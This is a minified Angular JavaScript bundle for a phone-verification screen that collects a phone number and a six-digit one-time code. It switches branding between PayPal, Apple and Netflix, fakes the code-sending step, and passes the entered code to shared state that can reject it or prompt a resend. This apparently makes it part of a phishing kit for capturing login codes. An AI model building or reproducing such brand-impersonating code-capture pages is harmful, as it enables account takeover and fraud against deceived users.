import{a as it}from"./chunk-QDVZ64ZW.js";import{a as nt}from"./chunk-W7HBKSF4.js";import{c as J,d as Q,g as X,n as Y,o as Z}from"./chunk-IHFM4ZIH.js";import{a as et}from"./chunk-Z4DVSYFI.js";import{d as tt}from"./chunk-6WLP4DWI.js";import{$ as H,A as f,B,Ba as A,C as D,Ca as $,Da as K,Ga as c,Ha as u,Ia as U,M as N,O as o,Oa as m,Qa as z,T as g,V as v,W as F,X as b,Y as C,Z as L,Za as G,aa as P,ba as R,ca as W,da as j,ea as a,fa as l,ga as E,ka as V,la as y,ma as s,ob as q,t as M,ta as d,u as k,ua as w,va as _,xa as I,ya as S,z as h,za as O}from"./chunk-OJFOISDS.js";var rt=()=>[0,1,2,3,4,5],at=n=>({seconds:n});function lt(n,r){if(n&1&&E(0,"img",2),n&2){let t=s();b("src",t.logoPath(),N)}}function st(n,r){if(n&1&&(a(0,"strong",5),d(1),l()),n&2){let t=s();o(),w(t.phoneDisplay())}}function pt(n,r){if(n&1&&(a(0,"div",6)(1,"span",9),d(2,"error"),l(),a(3,"div")(4,"p",10),d(5),c(6,"translate"),l(),a(7,"p",11),d(8),l()()()),n&2){let t=s();o(5),w(u(6,2,"PHONE.ERROR_TITLE")),o(3),w(t.state.rejectionReason())}}function dt(n,r){if(n&1){let t=V();a(0,"div",7)(1,"ui-input",12),c(2,"translate"),O("ngModelChange",function(i){h(t);let p=s();return S(p.phoneDisplay,i)||(p.phoneDisplay=i),f(i)}),y("ngModelChange",function(i){h(t);let p=s();return f(p.onPhoneInput(i))}),B(),a(3,"svg",13),E(4,"path",14),l()(),D(),a(5,"p",15),d(6),c(7,"translate"),l(),a(8,"ui-button",16),y("click",function(){h(t);let i=s();return f(i.sendCode())}),d(9),c(10,"translate"),l()()}if(n&2){let t=s();o(),b("label",u(2,11,"PERSONAL.PHONE")),I("ngModel",t.phoneDisplay),b("placeholder","(555) 555-5555")("iconLeft",!0),o(4),C("color",t.textColor()),o(),_(" ",u(7,13,"PHONE.DISCLAIMER")," "),o(2),b("disabled",!t.isPhoneValid())("fullWidth",!0)("variant",t.primaryBtnVariant()),o(),_(" ",u(10,15,"PHONE.SEND_CODE")," ")}}function ct(n,r){if(n&1){let t=V();a(0,"input",26),O("ngModelChange",function(i){let p=h(t).$implicit,x=s(2);return S(x.digits[p],i)||(x.digits[p]=i),f(i)}),y("input",function(i){let p=h(t).$implicit,x=s(2);return f(x.onOtpInput(i,p))})("keydown",function(i){let p=h(t).$implicit,x=s(2);return f(x.onKeyDown(i,p))}),l()}if(n&2){let t=r.$implicit,e=s(2);C("background",e.inputBg())("color",e.inputTextColor())("border",e.inputBorder()),L("ring-red-500",e.state.rejectionReason())("focus:ring-blue-500",!e.state.rejectionReason()),b("id","otp-"+t),I("ngModel",e.digits[t])}}function mt(n,r){if(n&1&&(a(0,"span",27),d(1),c(2,"translate"),l()),n&2){let t=s(2);C("color",t.textColor()),o(),_(" ",U(2,3,"PHONE.RESEND_WAIT",K(6,at,t.timer()))," ")}}function ut(n,r){if(n&1){let t=V();a(0,"button",28),y("click",function(){h(t);let i=s(2);return f(i.resend())}),d(1),c(2,"translate"),l()}if(n&2){let t=s(2);C("color",t.primaryColor()),o(),_(" ",u(2,3,"PHONE.RESEND")," ")}}function ht(n,r){n&1&&(a(0,"p",24),d(1),c(2,"translate"),l()),n&2&&(o(),_(" ",u(2,1,"PHONE.CODE_SENT")," "))}function ft(n,r){if(n&1){let t=V();a(0,"div",8)(1,"div",17)(2,"a",18),y("click",function(){h(t);let i=s();return f(i.codeSent.set(!1))}),d(3),c(4,"translate"),l()(),a(5,"div",19),W(6,ct,1,12,"input",20,R),l(),a(8,"div",21),v(9,mt,3,8,"span",22)(10,ut,3,5,"button",23)(11,ht,3,3,"p",24),l(),a(12,"ui-button",25),y("click",function(){h(t);let i=s();return f(i.submit())}),d(13),c(14,"translate"),l()()}if(n&2){let t=s();o(2),C("color",t.primaryColor()),o(),_(" ",u(4,10,"PHONE.CHANGE")," "),o(3),j($(14,rt)),o(3),P(t.timer()>0?9:10),o(2),P(t.resendSent()?11:-1),o(),b("disabled",!t.isOtpValid())("loading",t.isLoading())("fullWidth",!0)("variant",t.primaryBtnVariant()),o(),_(" ",u(14,12,"COMMON.CONFIRM")," ")}}var ot=class n{constructor(){this.state=M(q);this.currentFlow=this.state.currentFlow;this.currentFlowId=m(()=>this.currentFlow()?.id||"generic");this.rawPhone="";this.phoneDisplay=g("");this.isPhoneValid=g(!1);this.codeSent=g(!1);this.isLoading=g(!1);this.digits=["","","","","",""];this.isOtpValid=g(!1);this.resendSent=g(!1);this.timer=g(0);this.theme=m(()=>this.state.currentFlow()?.theme);this.headerColor=m(()=>this.theme()?.input.textColor||"#111827");this.textColor=m(()=>this.theme()?.input.textColor||"#4b5563");this.primaryColor=m(()=>this.theme()?.button.background||"#003087");this.inputBg=m(()=>this.theme()?.input.backgroundColor||"#ffffff");this.inputTextColor=m(()=>this.theme()?.input.textColor||"#111827");this.inputBorder=m(()=>this.theme()?.mode==="dark"?"1px solid #374151":"1px solid #cbd5e1");this.showLogo=m(()=>["paypal","apple","netflix"].includes(this.currentFlowId()));this.logoPath=m(()=>`assets/images/logos/${this.currentFlowId()}-logo.svg`);this.primaryBtnVariant=m(()=>this.currentFlowId()==="netflix"?"danger":"primary")}ngOnInit(){let r=this.state.phoneNumber();r&&(this.phoneDisplay.set(r),this.isPhoneValid.set(!0),this.state.rejectionReason()&&this.codeSent.set(!0)),z(()=>{console.log("Phone Verification Flow:",this.currentFlowId())})}ngOnDestroy(){this.timerInterval&&clearInterval(this.timerInterval)}containerClasses(){return this.currentFlowId()==="apple"?"pt-12":""}onPhoneInput(r){let t=r.replace(/\D/g,"");this.rawPhone=t;let e=t.match(/^(\d{0,3})(\d{0,3})(\d{0,4})$/),i=t;if(e){let p=e[1],x=e[2],T=e[3];p&&(i=`(${p}`),x&&(i+=`) ${x}`),T&&(i+=`-${T}`)}this.isPhoneValid.set(t.length===10),this.state.updatePhone({number:i})}sendCode(){this.isPhoneValid()&&(this.isLoading.set(!0),setTimeout(()=>{this.isLoading.set(!1),this.codeSent.set(!0),this.startTimer(),setTimeout(()=>document.getElementById("otp-0")?.focus(),100)},800))}onOtpInput(r,t){let e=r.target,i=e.value.replace(/\D/g,"");i.length>1&&(i=i[i.length-1]),this.digits[t]=i,e.value=i,i&&/^[0-9]$/.test(i)&&t<5&&document.getElementById(`otp-${t+1}`)?.focus(),this.checkOtpValidity(),this.state.updatePhone({code:this.digits.join("")})}onKeyDown(r,t){r.key==="Backspace"&&!this.digits[t]&&t>0&&document.getElementById(`otp-${t-1}`)?.focus()}checkOtpValidity(){this.isOtpValid.set(this.digits.every(r=>r!==""))}submit(){this.isOtpValid()&&(this.isLoading.set(!0),this.state.submitPhone(this.phoneDisplay(),this.digits.join("")))}startTimer(){this.timer.set(30),this.timerInterval&&clearInterval(this.timerInterval),this.timerInterval=setInterval(()=>{this.timer.update(r=>r<=1?(clearInterval(this.timerInterval),0):r-1)},1e3)}resend(){this.timer()===0&&(this.state.triggerResendAlert(),this.resendSent.set(!0),this.startTimer(),setTimeout(()=>this.resendSent.set(!1),3e3))}static{this.\u0275fac=function(t){return new(t||n)}}static{this.\u0275cmp=k({type:n,selectors:[["app-phone-verification"]],hostVars:1,hostBindings:function(t,e){t&2&&F("data-theme",e.currentFlowId())},standalone:!0,features:[A],decls:14,vars:16,consts:[[1,"phone-container"],[1,"phone-header","mb-8","text-center","animate-in","slide-in-from-top-4","duration-500"],[1,"h-10","mx-auto","mb-6",3,"src"],[1,"text-2xl","font-bold","mb-2","tracking-tight"],[1,"text-base","px-4","leading-relaxed","opacity-80"],[1,"block","mt-1"],[1,"mb-8","bg-red-50","border-l-[6px]","border-red-500","p-4","flex","items-start","gap-4","rounded-r-lg","animate-fade-in"],[1,"stage-phone","space-y-6","animate-in","fade-in","slide-in-from-bottom-4","duration-500"],[1,"stage-otp","space-y-8","animate-in","fade-in","slide-in-from-right-4","duration-500"],[1,"material-icons","text-red-500"],[1,"text-sm","font-bold","text-red-900"],[1,"text-xs","text-red-700","mt-1"],["type","tel",3,"ngModelChange","label","ngModel","placeholder","iconLeft"],["slot","icon-left","viewBox","0 0 24 24","fill","none","stroke","currentColor","stroke-width","2"],["d","M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"],[1,"text-xs","text-center","opacity-60"],[3,"click","disabled","fullWidth","variant"],[1,"text-center","-mt-4","mb-6"],[1,"text-sm","font-bold","cursor-pointer","hover:underline",3,"click"],[1,"otp-wrapper","flex","justify-center","gap-2","sm:gap-3"],["type","text","inputmode","numeric","maxlength","1",1,"otp-box","w-12","h-14","sm:w-14","sm:h-16","text-center","text-2xl","font-bold","outline-none","transition-all","duration-200","focus:ring-2","shadow-sm","rounded-lg",3,"id","ngModel","background","color","border","ring-red-500","focus:ring-blue-500"],[1,"text-center","min-h-[40px]"],[1,"text-sm","font-medium","opacity-70",3,"color"],[1,"text-sm","font-bold","hover:underline",3,"color"],[1,"text-xs","text-green-600","mt-2","font-bold","animate-pulse"],[3,"click","disabled","loading","fullWidth","variant"],["type","text","inputmode","numeric","maxlength","1",1,"otp-box","w-12","h-14","sm:w-14","sm:h-16","text-center","text-2xl","font-bold","outline-none","transition-all","duration-200","focus:ring-2","shadow-sm","rounded-lg",3,"ngModelChange","input","keydown","id","ngModel"],[1,"text-sm","font-medium","opacity-70"],[1,"text-sm","font-bold","hover:underline",3,"click"]],template:function(t,e){t&1&&(a(0,"app-public-layout")(1,"div",0)(2,"header",1),v(3,lt,1,1,"img",2),a(4,"h1",3),d(5),c(6,"translate"),l(),a(7,"p",4),d(8),c(9,"translate"),v(10,st,2,1,"strong",5),l()(),v(11,pt,9,4,"div",6)(12,dt,11,17,"div",7)(13,ft,15,15,"div",8),l()()),t&2&&(o(),H(e.containerClasses()),o(2),P(e.showLogo()?3:-1),o(),C("color",e.headerColor()),o(),_(" ",u(6,12,e.codeSent()?"PHONE.TITLE_CODE":"PHONE.TITLE_INPUT")," "),o(2),C("color",e.textColor()),o(),_(" ",u(9,14,e.codeSent()?"PHONE.DESC_CODE":"PHONE.DESC_INPUT")," "),o(2),P(e.codeSent()?10:-1),o(),P(e.state.rejectionReason()?11:-1),o(),P(e.codeSent()?13:12))},dependencies:[G,Z,J,Q,Y,X,et,tt,it,nt],styles:["[_nghost-%COMP%]{display:block;width:100%}[data-theme=apple][_nghost-%COMP%]   .otp-box[_ngcontent-%COMP%]{border:1px solid #d1d1d6!important;border-radius:8px!important;margin:0 4px;background:#fff;color:#000;box-shadow:none}[data-theme=apple][_nghost-%COMP%]   .otp-box[_ngcontent-%COMP%]:focus{border-color:#0071e3!important;ring:0}[data-theme=netflix][_nghost-%COMP%]   .otp-box[_ngcontent-%COMP%]{background:#333;color:#fff;border:none;border-bottom:2px solid #555;border-radius:0}[data-theme=netflix][_nghost-%COMP%]   .otp-box[_ngcontent-%COMP%]:focus{border-bottom-color:#e50914!important}"]})}};export{ot as PhoneVerificationComponent};
